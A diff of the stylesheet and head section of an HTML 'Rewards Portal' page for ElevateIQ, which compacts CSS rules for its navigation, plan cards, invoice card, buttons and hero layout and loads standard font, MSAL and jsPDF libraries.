@@ -4,162 +4,113 @@
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
 <title>ElevateIQ — Rewards Portal</title>
-<link rel="preconnect" href="https://fonts.googleapis.com"/>
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
-<link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,300;9..40,400;9..40,500;9..40,600;9..40,700&display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&display=swap" rel="stylesheet"/>
 <script src="https://alcdn.msauth.net/browser/2.38.2/js/msal-browser.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-:root{
-  --bg:#050608;--bg2:#08090f;--bg3:#0c0e18;--bg4:#111422;
-  --card:rgba(255,255,255,0.03);--cardh:rgba(255,255,255,0.055);
-  --b:rgba(255,255,255,0.07);--b2:rgba(255,255,255,0.13);
-  --t:#eef0ff;--t2:rgba(238,240,255,0.52);--t3:rgba(238,240,255,0.26);
-  --ac:#6c63ff;--ac2:#8b85ff;--acg:rgba(108,99,255,0.22);
-  --go:#f4c430;--gog:rgba(244,196,48,0.14);
-  --gr:#00e676;--grg:rgba(0,230,118,0.12);
-  --re:#ff5252;--reg:rgba(255,82,82,0.12);
-  --mc:#00e676;--rb:#ff5252;--xb:#00e676;
-  --nh:58px;--r:12px;--r2:18px;--r3:24px;
-}
-html{-webkit-font-smoothing:antialiased;scroll-behavior:smooth}
+:root{--bg:#050608;--card:rgba(255,255,255,.04);--cardh:rgba(255,255,255,.07);--b:rgba(255,255,255,.08);--b2:rgba(255,255,255,.15);--t:#eef0ff;--t2:rgba(238,240,255,.52);--t3:rgba(238,240,255,.26);--ac:#6c63ff;--ac2:#8b85ff;--acg:rgba(108,99,255,.2);--go:#f4c430;--gog:rgba(244,196,48,.14);--gr:#00e676;--grg:rgba(0,230,118,.12);--re:#ff5252;--reg:rgba(255,82,82,.12);--mc:#00e676;--rb:#ff5252;--xb:#00e676;--r:12px;--r2:18px;--nh:58px}
+html{-webkit-font-smoothing:antialiased}
 body{font-family:'DM Sans',sans-serif;background:var(--bg);color:var(--t);min-height:100vh;overflow-x:hidden;line-height:1.5}
-::-webkit-scrollbar{width:3px}
-::-webkit-scrollbar-thumb{background:rgba(108,99,255,.4);border-radius:3px}
-
-/* KEYFRAMES */
-@keyframes fadeUp{0%{opacity:0;transform:translateY(30px)}100%{opacity:1;transform:translateY(0)}}
+::-webkit-scrollbar{width:3px}::-webkit-scrollbar-thumb{background:rgba(108,99,255,.4);border-radius:3px}
 @keyframes fadeIn{from{opacity:0}to{opacity:1}}
-@keyframes popIn{0%{opacity:0;transform:scale(0.5)}100%{opacity:1;transform:scale(1)}}
+@keyframes popIn{0%{opacity:0;transform:scale(.5)}100%{opacity:1;transform:scale(1)}}
 @keyframes spin{to{transform:rotate(360deg)}}
 @keyframes floatY{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
-@keyframes glowPulse{0%,100%{box-shadow:0 0 16px var(--acg)}50%{box-shadow:0 0 44px var(--acg)}}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+@keyframes glow{0%,100%{box-shadow:0 0 16px var(--acg)}50%{box-shadow:0 0 44px var(--acg)}}
 @keyframes checkDraw{from{stroke-dashoffset:30}to{stroke-dashoffset:0}}
-@keyframes progressBar{from{width:0}to{width:var(--pw,0%)}}
 @keyframes slideUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
 @keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}
-
-/* SCROLL REVEAL */
-.rv{opacity:0;transform:translateY(32px);transition:opacity .65s cubic-bezier(.22,1,.36,1),transform .65s cubic-bezier(.22,1,.36,1);will-change:transform}
-.rv.d1{transition-delay:.07s}.rv.d2{transition-delay:.14s}
-.rv.d3{transition-delay:.21s}.rv.d4{transition-delay:.28s}
-.rv.in{opacity:1;transform:translateY(0)}
-
+/* === PAGE SYSTEM === */
+.page{display:none !important}
+.page.active{display:block !important;animation:fadeIn .3s ease}
+/* === LAYOUT === */
+.wrap{max-width:1160px;margin:0 auto;padding:0 24px 100px;position:relative;z-index:1}
+.wsm{max-width:580px;margin:0 auto;padding:0 24px 100px;position:relative;z-index:1}
+.wmd{max-width:900px;margin:0 auto;padding:0 24px 100px;position:relative;z-index:1}
 /* BG */
-.bgs{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
-.bgm{position:absolute;inset:0;background-image:linear-gradient(rgba(108,99,255,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(108,99,255,.03) 1px,transparent 1px);background-size:70px 70px;mask-image:radial-gradient(ellipse 90% 60% at 50% 0%,#000,transparent)}
-.bgo{position:absolute;border-radius:50%;filter:blur(110px);pointer-events:none}
-.o1{width:700px;height:700px;top:-250px;left:-180px;background:radial-gradient(circle,rgba(108,99,255,.09),transparent 70%)}
-.o2{width:550px;height:550px;bottom:-200px;right:-120px;background:radial-gradient(circle,rgba(0,230,118,.055),transparent 70%)}
-
+.bgs{position:fixed;inset:0;z-index:0;pointer-events:none}
+.bgm{position:absolute;inset:0;background-image:linear-gradient(rgba(108,99,255,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(108,99,255,.03) 1px,transparent 1px);background-size:70px 70px}
+.o1{position:absolute;width:700px;height:700px;top:-250px;left:-180px;background:radial-gradient(circle,rgba(108,99,255,.09),transparent 70%);border-radius:50%;filter:blur(110px)}
+.o2{position:absolute;width:550px;height:550px;bottom:-200px;right:-120px;background:radial-gradient(circle,rgba(0,230,118,.06),transparent 70%);border-radius:50%;filter:blur(110px)}
 /* NAV */
-nav{position:sticky;top:0;z-index:500;height:var(--nh);display:flex;align-items:center;padding:0 24px;background:rgba(5,6,8,.84);backdrop-filter:blur(28px) saturate(180%);-webkit-backdrop-filter:blur(28px) saturate(180%);border-bottom:1px solid var(--b)}
+nav{position:sticky;top:0;z-index:500;height:var(--nh);display:flex;align-items:center;padding:0 24px;background:rgba(5,6,8,.9);backdrop-filter:blur(24px);border-bottom:1px solid var(--b)}
 .ni{max-width:1160px;width:100%;margin:0 auto;display:flex;align-items:center;justify-content:space-between;gap:14px}
 .brand{display:flex;align-items:center;gap:9px;cursor:pointer;flex-shrink:0}
-.bmark{width:32px;height:32px;border-radius:9px;background:linear-gradient(135deg,var(--ac),var(--ac2));display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;color:#fff;animation:glowPulse 3.5s ease-in-out infinite}
-.bname{font-size:15.5px;font-weight:700;letter-spacing:-.3px}
-.bname span{color:var(--ac2)}
+.bmark{width:32px;height:32px;border-radius:9px;background:linear-gradient(135deg,var(--ac),var(--ac2));display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;color:#fff;animation:glow 3.5s ease-in-out infinite}
+.bname{font-size:15px;font-weight:700}.bname span{color:var(--ac2)}
 .ntabs{display:flex;align-items:center;gap:2px;overflow-x:auto;scrollbar-width:none}
 .ntabs::-webkit-scrollbar{display:none}
-.ntab{white-space:nowrap;padding:5px 13px;border-radius:8px;color:var(--t2);font-size:13px;font-weight:500;cursor:pointer;border:none;background:none;font-family:'DM Sans',sans-serif;transition:color .18s,background .18s;letter-spacing:-.1px}
+.ntab{white-space:nowrap;padding:5px 13px;border-radius:8px;color:var(--t2);font-size:13px;font-weight:500;cursor:pointer;border:none;background:none;font-family:'DM Sans',sans-serif;transition:all .18s}
 .ntab:hover{color:var(--t);background:var(--cardh)}
 .ntab.active{color:var(--ac2);background:rgba(108,99,255,.11);font-weight:600}
 .nr{display:flex;align-items:center;gap:9px;flex-shrink:0}
-.cpill{display:none;align-items:center;gap:6px;background:var(--gog);border:1px solid rgba(244,196,48,.22);border-radius:100px;padding:5px 13px;font-size:13px;font-weight:700;color:var(--go);cursor:pointer;transition:all .2s}
-.cpill:hover{transform:translateY(-1px)}
-.dc-btn{display:flex;align-items:center;gap:7px;background:rgba(88,101,242,.11);border:1px solid rgba(88,101,242,.24);border-radius:9px;padding:7px 15px;color:#a5b4fc;font-size:13px;font-weight:600;cursor:pointer;transition:all .2s;font-family:'DM Sans',sans-serif}
-.dc-btn:hover{background:rgba(88,101,242,.2);transform:translateY(-1px)}
+.cpill{display:none;align-items:center;gap:6px;background:var(--gog);border:1px solid rgba(244,196,48,.22);border-radius:100px;padding:5px 13px;font-size:13px;font-weight:700;color:var(--go);cursor:pointer}
+.dcb{display:flex;align-items:center;gap:7px;background:rgba(88,101,242,.11);border:1px solid rgba(88,101,242,.24);border-radius:9px;padding:7px 15px;color:#a5b4fc;font-size:13px;font-weight:600;cursor:pointer;font-family:'DM Sans',sans-serif;transition:all .2s}
+.dcb:hover{background:rgba(88,101,242,.2)}
 .nav-user{display:flex;align-items:center;gap:8px}
 .nav-av{width:28px;height:28px;border-radius:50%;border:2px solid var(--ac);object-fit:cover}
-.nav-nm{font-size:13px;font-weight:600;letter-spacing:-.1px}
-.nav-out{background:none;border:1px solid var(--b);border-radius:6px;padding:3px 9px;color:var(--t3);font-size:11.5px;cursor:pointer;transition:all .2s;font-family:'DM Sans',sans-serif}
+.nav-nm{font-size:13px;font-weight:600}
+.nav-out{background:none;border:1px solid var(--b);border-radius:6px;padding:3px 9px;color:var(--t3);font-size:11px;cursor:pointer;font-family:'DM Sans',sans-serif;transition:all .2s}
 .nav-out:hover{color:var(--re);border-color:rgba(255,82,82,.28)}
-.hbg{display:none;flex-direction:column;gap:4px;background:none;border:none;cursor:pointer;padding:5px;flex-shrink:0}
+.hbg{display:none;flex-direction:column;gap:4px;background:none;border:none;cursor:pointer;padding:5px}
 .hbg span{display:block;width:18px;height:1.5px;background:var(--t2);border-radius:2px;transition:all .3s}
 .hbg.open span:nth-child(1){transform:rotate(45deg) translate(4px,4px)}
 .hbg.open span:nth-child(2){opacity:0}
 .hbg.open span:nth-child(3){transform:rotate(-45deg) translate(4px,-4px)}
-.mob{display:none;position:fixed;top:var(--nh);left:0;right:0;background:rgba(5,6,8,.97);backdrop-filter:blur(28px);border-bottom:1px solid var(--b);z-index:499;padding:10px 18px 16px;flex-direction:column;gap:2px}
+.mob{display:none;position:fixed;top:var(--nh);left:0;right:0;background:rgba(5,6,8,.97);backdrop-filter:blur(24px);border-bottom:1px solid var(--b);z-index:499;padding:10px 18px 16px;flex-direction:column;gap:2px}
 .mob.open{display:flex;animation:fadeIn .18s}
 .mob .ntab{padding:12px 14px;font-size:15px;text-align:left}
-
-/* PAGES */
-.page{display:none;position:relative;z-index:1;opacity:0;transform:translateY(12px);transition:opacity .45s cubic-bezier(.22,1,.36,1),transform .45s cubic-bezier(.22,1,.36,1)}
-.page.active{display:block}
-.page.visible{opacity:1;transform:translateY(0)}
-.wrap{max-width:1160px;margin:0 auto;padding:0 24px 100px}
-.wsm{max-width:560px;margin:0 auto;padding:0 24px 100px}
-.wmd{max-width:900px;margin:0 auto;padding:0 24px 100px}
-
-/* CARD */
-.card{background:var(--card);border:1px solid var(--b);border-radius:var(--r2);padding:26px;margin-bottom:14px;position:relative;overflow:hidden;transition:border-color .22s,background .22s;backdrop-filter:blur(10px)}
+/* CARDS */
+.card{background:var(--card);border:1px solid var(--b);border-radius:var(--r2);padding:26px;margin-bottom:14px;position:relative;overflow:hidden;transition:border-color .2s}
 .card:hover{border-color:var(--b2)}
 .cline{position:absolute;top:0;left:0;right:0;height:1px}
-.card h3{font-size:15px;font-weight:700;letter-spacing:-.3px;margin-bottom:5px}
+.card h3{font-size:15px;font-weight:700;margin-bottom:5px}
 .card>p{font-size:13.5px;color:var(--t2);line-height:1.7;margin-bottom:20px}
-
 /* BUTTONS */
-.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;border:none;border-radius:var(--r);padding:13px 22px;font-family:'DM Sans',sans-serif;font-size:14px;font-weight:600;cursor:pointer;transition:all .22s cubic-bezier(.22,1,.36,1);letter-spacing:-.2px;white-space:nowrap}
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;border:none;border-radius:var(--r);padding:13px 22px;font-family:'DM Sans',sans-serif;font-size:14px;font-weight:600;cursor:pointer;transition:all .2s;white-space:nowrap}
 .btn:active{transform:scale(.97)!important}
 .btn:disabled{opacity:.4;cursor:not-allowed;transform:none!important}
 .btn-full{width:100%}
 .btn-ac{background:linear-gradient(135deg,var(--ac),var(--ac2));color:#fff;box-shadow:0 4px 20px var(--acg)}
 .btn-ac:hover{transform:translateY(-2px);box-shadow:0 8px 28px var(--acg)}
 .btn-go{background:linear-gradient(135deg,#f4c430,#ffda44);color:#000;font-weight:700}
-.btn-go:hover{transform:translateY(-2px);box-shadow:0 8px 28px var(--gog)}
-.btn-dc{background:#5865f2;color:#fff}
-.btn-dc:hover{background:#4752c4;transform:translateY(-2px);box-shadow:0 6px 22px rgba(88,101,242,.32)}
-.btn-ms{background:#fff;color:#000}
-.btn-ms:hover{background:#f5f5f7;transform:translateY(-2px)}
-.btn-gh{background:var(--card);border:1px solid var(--b);color:var(--t)}
-.btn-gh:hover{background:var(--cardh);border-color:var(--b2);transform:translateY(-2px)}
-.btn-mc{background:var(--mc);color:#000}
-.btn-mc:hover{filter:brightness(1.1);transform:translateY(-2px);box-shadow:0 6px 24px var(--grg)}
-.btn-rb{background:var(--rb);color:#fff}
-.btn-rb:hover{filter:brightness(1.1);transform:translateY(-2px);box-shadow:0 6px 24px var(--reg)}
-.btn-xb{background:var(--xb);color:#000}
-.btn-xb:hover{filter:brightness(1.1);transform:translateY(-2px)}
+.btn-go:hover{transform:translateY(-2px)}
+.btn-dc{background:#5865f2;color:#fff}.btn-dc:hover{background:#4752c4;transform:translateY(-2px)}
+.btn-ms{background:#fff;color:#000}.btn-ms:hover{background:#f0f0f0;transform:translateY(-2px)}
+.btn-gh{background:var(--card);border:1px solid var(--b);color:var(--t)}.btn-gh:hover{background:var(--cardh);border-color:var(--b2);transform:translateY(-2px)}
+.btn-mc{background:var(--mc);color:#000}.btn-mc:hover{filter:brightness(1.1);transform:translateY(-2px)}
+.btn-rb{background:var(--rb);color:#fff}.btn-rb:hover{filter:brightness(1.1);transform:translateY(-2px)}
+.btn-xb{background:var(--xb);color:#000}.btn-xb:hover{filter:brightness(1.1);transform:translateY(-2px)}
 .bspin{width:16px;height:16px;border:2px solid rgba(255,255,255,.25);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0}
-.btn-ms .bspin,.btn-mc .bspin,.btn-xb .bspin,.btn-go .bspin{border-color:rgba(0,0,0,.2);border-top-color:#000}
-
-/* INPUTS */
+/* FORM */
 .field{margin-bottom:16px}
 .field label{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.9px;color:var(--t3);margin-bottom:8px}
-.irow{position:relative}
-.inp{width:100%;background:rgba(255,255,255,.03);border:1px solid var(--b);border-radius:var(--r);padding:13px 44px 13px 15px;color:var(--t);font-family:'DM Sans',sans-serif;font-size:14px;font-weight:500;outline:none;transition:all .2s}
-.inp.code{font-size:16px;font-weight:700;letter-spacing:3px;text-transform:uppercase;text-align:center;padding:14px}
-.inp::placeholder{color:var(--t3);font-weight:400;font-size:13.5px;letter-spacing:0}
-.inp.code::placeholder{letter-spacing:.5px;font-size:13px;font-weight:400}
+.inp{width:100%;background:rgba(255,255,255,.03);border:1px solid var(--b);border-radius:var(--r);padding:13px 15px;color:var(--t);font-family:'DM Sans',sans-serif;font-size:14px;outline:none;transition:all .2s}
+.inp.code{font-size:17px;font-weight:700;letter-spacing:3px;text-transform:uppercase;text-align:center;padding:18px}
+.inp::placeholder{color:var(--t3);font-size:13px}
+.inp.code::placeholder{font-size:12px;letter-spacing:.5px}
 .inp:focus{border-color:var(--ac2);background:rgba(108,99,255,.04);box-shadow:0 0 0 3px rgba(108,99,255,.1)}
-.inp.err{border-color:var(--re)!important;box-shadow:0 0 0 3px var(--reg)!important;animation:shake .3s ease}
-.iact{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:var(--t3);font-size:15px;padding:3px;transition:color .18s}
-.iact:hover{color:var(--t2)}
+.inp.err{border-color:var(--re)!important;animation:shake .3s ease}
 .fmsg{font-size:12px;margin-top:6px;color:var(--t3)}
 .fmsg.err{color:var(--re)}.fmsg.ok{color:var(--gr)}
-
 /* PLANS */
 .plans{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:22px}
 .plan{background:rgba(255,255,255,.025);border:1.5px solid var(--b);border-radius:var(--r);padding:18px;cursor:pointer;position:relative;transition:all .22s}
 .plan:hover{border-color:var(--b2);transform:translateY(-2px)}
 .plan.sel{transform:translateY(-2px)}
-.pchk{position:absolute;top:11px;right:11px;width:20px;height:20px;border-radius:50%;display:none;align-items:center;justify-content:center;animation:popIn .3s cubic-bezier(.34,1.56,.64,1)}
+.pchk{position:absolute;top:11px;right:11px;width:20px;height:20px;border-radius:50%;display:none;align-items:center;justify-content:center}
 .plan.sel .pchk{display:flex}
 .plan-p{font-size:26px;font-weight:700;letter-spacing:-1px;margin-bottom:2px}
-.plan-t{font-size:10.5px;font-weight:600;text-transform:uppercase;letter-spacing:.9px;color:var(--t3);margin-bottom:8px}
-.plan-r{font-size:12.5px;color:var(--t2);margin-bottom:5px}
-.plan-c{font-size:13px;font-weight:700;color:var(--go);display:flex;align-items:center;gap:5px}
-
+.plan-t{font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.9px;color:var(--t3);margin-bottom:8px}
+.plan-c{font-size:13px;font-weight:700;color:var(--go)}
 /* USER PILL */
-.upill{display:flex;align-items:center;gap:9px;background:var(--grg);border:1px solid rgba(0,230,118,.16);border-radius:100px;padding:7px 14px 7px 8px;margin-bottom:16px;animation:slideUp .35s ease}
-.uav{width:29px;height:29px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;color:#fff;flex-shrink:0}
-.unm{font-size:13.5px;font-weight:600;flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.ubdg{font-size:11px;font-weight:700;color:var(--gr);display:flex;align-items:center;gap:4px;flex-shrink:0}
-.ubdg::before{content:'';display:block;width:5px;height:5px;border-radius:50%;background:var(--gr)}
-.bsw{background:none;border:1px solid var(--b);border-radius:6px;padding:3px 9px;color:var(--t3);font-size:11px;cursor:pointer;transition:all .2s;font-family:'DM Sans',sans-serif}
-.bsw:hover{border-color:var(--b2);color:var(--t2)}
-
+.upill{display:flex;align-items:center;gap:9px;background:var(--grg);border:1px solid rgba(0,230,118,.16);border-radius:100px;padding:7px 14px 7px 8px;margin-bottom:16px}
+.uav{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;color:#fff;flex-shrink:0}
+.unm{font-size:13px;font-weight:600;flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.ubdg{font-size:11px;font-weight:700;color:var(--gr);flex-shrink:0}
+.bsw{background:none;border:1px solid var(--b);border-radius:6px;padding:3px 9px;color:var(--t3);font-size:11px;cursor:pointer;font-family:'DM Sans',sans-serif}
 /* NOTICE */
 .notice{border-radius:var(--r);padding:13px 16px;margin-bottom:14px}
 .nw{background:rgba(244,196,48,.065);border:1px solid rgba(244,196,48,.17)}
@@ -167,88 +118,68 @@ nav{position:sticky;top:0;z-index:500;height:var(--nh);display:flex;align-items:
 .nt{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.9px;margin-bottom:6px}
 .nw .nt{color:var(--go)}.ni2 .nt{color:var(--ac2)}
 .notice p{font-size:13px;color:var(--t2);line-height:1.65}
-.notice p strong{color:var(--t);font-weight:600}
-.clinks{display:flex;flex-wrap:wrap;gap:7px;margin-top:9px}
-.clink{display:inline-flex;align-items:center;gap:5px;background:var(--cardh);border:1px solid var(--b);border-radius:100px;padding:4px 12px;font-size:12px;color:var(--t2);text-decoration:none;cursor:pointer;transition:all .2s;font-family:'DM Sans',sans-serif;font-weight:500}
-.clink:hover{border-color:var(--go);color:var(--go)}
-
-/* INVOICE CARD */
+/* INVOICE */
 .inv-card{background:#070810;border:1px solid rgba(108,99,255,.18);border-radius:var(--r2);overflow:hidden;margin-bottom:14px}
-.inv-head{padding:20px 22px;display:flex;justify-content:space-between;align-items:flex-start;border-bottom:1px solid rgba(255,255,255,.05)}
-.inv-logo-wrap{display:flex;align-items:center;gap:9px}
-.inv-logo{width:28px;height:28px;border-radius:7px;background:linear-gradient(135deg,var(--ac),var(--ac2));display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;color:#fff}
-.inv-ttl{font-size:15px;font-weight:700;color:var(--t)}
-.inv-sub{font-size:10px;color:var(--t3);font-weight:600;letter-spacing:.7px;text-transform:uppercase;margin-top:2px}
-.inv-no-v{font-size:13px;font-weight:700;color:var(--ac2);letter-spacing:.5px;text-align:right}
-.inv-no-d{font-size:11px;color:var(--t3);margin-top:3px;text-align:right}
-.inv-bar{padding:9px 22px;display:flex;align-items:center;gap:7px;border-bottom:1px solid rgba(255,255,255,.05);background:rgba(0,230,118,.05)}
-.inv-dot2{width:7px;height:7px;border-radius:50%;background:var(--gr);flex-shrink:0;animation:pulse 2s infinite}
-.inv-bar-t{font-size:11.5px;font-weight:700;color:var(--gr);letter-spacing:.4px}
-.inv-cust{padding:18px 22px;border-bottom:1px solid rgba(255,255,255,.05)}
-.inv-sl{font-size:10px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--t3);margin-bottom:10px}
-.inv-ur{display:flex;align-items:center;gap:11px}
-.inv-uav{width:38px;height:38px;border-radius:50%;background:var(--ac);display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:700;color:#fff;flex-shrink:0}
-.inv-un{font-size:14px;font-weight:600;color:var(--t)}
-.inv-us{font-size:11.5px;color:var(--t3);margin-top:2px}
-.inv-rows{padding:18px 22px;border-bottom:1px solid rgba(255,255,255,.05)}
-.inv-row{display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid rgba(255,255,255,.04);gap:10px;font-size:13px}
+.inv-head{padding:16px 20px;display:flex;justify-content:space-between;align-items:flex-start;border-bottom:1px solid rgba(255,255,255,.05)}
+.inv-logo{width:26px;height:26px;border-radius:7px;background:linear-gradient(135deg,var(--ac),var(--ac2));display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:#fff}
+.inv-ttl{font-size:14px;font-weight:700;color:var(--t)}
+.inv-sub{font-size:10px;color:var(--t3);text-transform:uppercase;letter-spacing:.7px}
+.inv-nov{font-size:13px;font-weight:700;color:var(--ac2);text-align:right}
+.inv-nod{font-size:11px;color:var(--t3);text-align:right}
+.inv-bar{padding:8px 20px;display:flex;align-items:center;gap:7px;border-bottom:1px solid rgba(255,255,255,.05);background:rgba(0,230,118,.05)}
+.inv-dot{width:6px;height:6px;border-radius:50%;background:var(--gr);flex-shrink:0;animation:pulse 2s infinite}
+.inv-bt{font-size:11px;font-weight:700;color:var(--gr)}
+.inv-rows{padding:14px 20px;border-bottom:1px solid rgba(255,255,255,.05)}
+.inv-row{display:flex;justify-content:space-between;align-items:center;padding:6px 0;border-bottom:1px solid rgba(255,255,255,.04);font-size:13px}
 .inv-row:last-child{border-bottom:none}
-.inv-k{color:var(--t3);font-weight:500;flex-shrink:0}
-.inv-v{font-weight:600;text-align:right;color:var(--t);word-break:break-all}
-.inv-v.code{font-size:11px;letter-spacing:2.5px;font-weight:700;color:var(--ac2)}
+.inv-k{color:var(--t3);font-weight:500}
+.inv-v{font-weight:600;color:var(--t);word-break:break-all;text-align:right}
+.inv-v.code{font-size:11px;letter-spacing:2px;font-weight:700;color:var(--ac2)}
 .inv-v.price{color:var(--go)}
-.inv-log{padding:14px 22px;background:rgba(88,101,242,.04);border-bottom:1px solid rgba(255,255,255,.05)}
-.inv-li{font-size:11.5px;color:var(--t3);line-height:2.1}
-.inv-ft{padding:12px 22px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px}
-.inv-ft-t{font-size:10.5px;color:var(--t3)}
-
+.inv-ft{padding:10px 20px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px}
+.inv-ft-t{font-size:10px;color:var(--t3)}
 /* SUCCESS */
-.scard{background:var(--card);border:1px solid var(--b);border-radius:var(--r3);padding:36px 28px;text-align:center;display:none}
-.scard.show{display:block;animation:slideUp .5s cubic-bezier(.34,1.56,.64,1)}
-.sico{width:68px;height:68px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;animation:popIn .5s .1s cubic-bezier(.34,1.56,.64,1) both}
+.scard{background:var(--card);border:1px solid var(--b);border-radius:var(--r2);padding:36px 28px;text-align:center;display:none}
+.scard.show{display:block!important;animation:slideUp .5s ease}
+.sico{width:68px;height:68px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
 .stitle{font-size:26px;font-weight:700;letter-spacing:-1px;margin-bottom:7px}
 .sdesc{font-size:14px;color:var(--t2);line-height:1.75;margin-bottom:24px}
 .timrow{display:flex;align-items:center;justify-content:center;gap:8px;background:var(--cardh);border:1px solid var(--b);border-radius:var(--r);padding:10px 16px;font-size:13px;color:var(--t2);margin-bottom:14px}
 .timrow strong{color:var(--t)}
 .brow{display:grid;grid-template-columns:1fr 1fr;gap:10px}
-
 /* TOAST */
-#toast{position:fixed;bottom:22px;left:50%;transform:translateX(-50%) translateY(70px);z-index:9999;background:var(--bg4);border:1px solid var(--b2);border-radius:var(--r);padding:11px 20px;display:flex;align-items:center;gap:9px;font-size:13.5px;font-weight:500;box-shadow:0 18px 50px rgba(0,0,0,.65);opacity:0;transition:all .38s cubic-bezier(.34,1.56,.64,1);pointer-events:none;white-space:nowrap}
+#toast{position:fixed;bottom:22px;left:50%;transform:translateX(-50%) translateY(70px);z-index:9999;background:#111422;border:1px solid var(--b2);border-radius:var(--r);padding:11px 20px;display:flex;align-items:center;gap:9px;font-size:13.5px;font-weight:500;box-shadow:0 18px 50px rgba(0,0,0,.65);opacity:0;transition:all .35s ease;pointer-events:none;white-space:nowrap}
 #toast.show{transform:translateX(-50%) translateY(0);opacity:1}
-
 /* HOME */
-.hero{padding:96px 0 72px;text-align:center}
+.hero{padding:90px 0 70px;text-align:center}
 .hchip{display:inline-flex;align-items:center;gap:8px;background:rgba(108,99,255,.09);border:1px solid rgba(108,99,255,.18);border-radius:100px;padding:6px 16px;font-size:12px;font-weight:600;letter-spacing:.8px;text-transform:uppercase;color:var(--ac2);margin-bottom:26px}
 .hdot{width:6px;height:6px;border-radius:50%;background:var(--ac2);animation:pulse 2.5s infinite}
-.htitle{font-size:clamp(44px,7.5vw,88px);font-weight:700;letter-spacing:-3px;line-height:1.0;margin-bottom:22px;background:linear-gradient(160deg,#fff 25%,rgba(139,133,255,.65) 65%,rgba(108,99,255,.45) 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
-.hsub{font-size:16.5px;color:var(--t2);line-height:1.85;max-width:520px;margin:0 auto 40px;font-weight:400}
+.htitle{font-size:clamp(44px,7.5vw,88px);font-weight:700;letter-spacing:-3px;line-height:1;margin-bottom:22px;background:linear-gradient(160deg,#fff 25%,rgba(139,133,255,.65) 65%,rgba(108,99,255,.45) 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hsub{font-size:16px;color:var(--t2);line-height:1.85;max-width:520px;margin:0 auto 40px}
 .hbtns{display:flex;justify-content:center;gap:11px;flex-wrap:wrap}
-.sgrid{display:grid;grid-template-columns:repeat(5,1fr);border:1px solid var(--b);border-radius:var(--r2);overflow:hidden;background:var(--card);margin:52px 0;backdrop-filter:blur(10px)}
-.stat{padding:26px 16px;text-align:center;border-right:1px solid var(--b);transition:background .2s}
+.sgrid{display:grid;grid-template-columns:repeat(5,1fr);border:1px solid var(--b);border-radius:var(--r2);overflow:hidden;background:var(--card);margin:50px 0}
+.stat{padding:24px 14px;text-align:center;border-right:1px solid var(--b)}
 .stat:last-child{border-right:none}
-.stat:hover{background:var(--cardh)}
-.stn{font-size:30px;font-weight:700;letter-spacing:-1.5px;background:linear-gradient(135deg,var(--t),var(--ac2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
-.stl{font-size:10.5px;font-weight:600;text-transform:uppercase;letter-spacing:.9px;color:var(--t3);margin-top:3px}
-.cshow{background:linear-gradient(135deg,rgba(244,196,48,.07),rgba(244,196,48,.02));border:1px solid rgba(244,196,48,.14);border-radius:var(--r3);padding:44px 34px;margin-bottom:52px;display:flex;align-items:center;gap:44px;flex-wrap:wrap;position:relative;overflow:hidden}
-.cshow::before{content:'';position:absolute;top:-40%;right:-8%;width:360px;height:360px;background:radial-gradient(circle,rgba(244,196,48,.06),transparent 70%);pointer-events:none}
-.coin3d{width:106px;height:106px;border-radius:50%;flex-shrink:0;background:linear-gradient(145deg,#ffd700,#f4a01c,#ffd700,#ffec6e);display:flex;align-items:center;justify-content:center;box-shadow:0 0 36px rgba(244,196,48,.38),0 8px 28px rgba(0,0,0,.38);font-size:42px;animation:floatY 4s ease-in-out infinite;position:relative}
-.coin3d::after{content:'';position:absolute;inset:4px;border-radius:50%;border:2px solid rgba(255,255,255,.18);pointer-events:none}
+.stn{font-size:28px;font-weight:700;letter-spacing:-1.5px;background:linear-gradient(135deg,var(--t),var(--ac2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
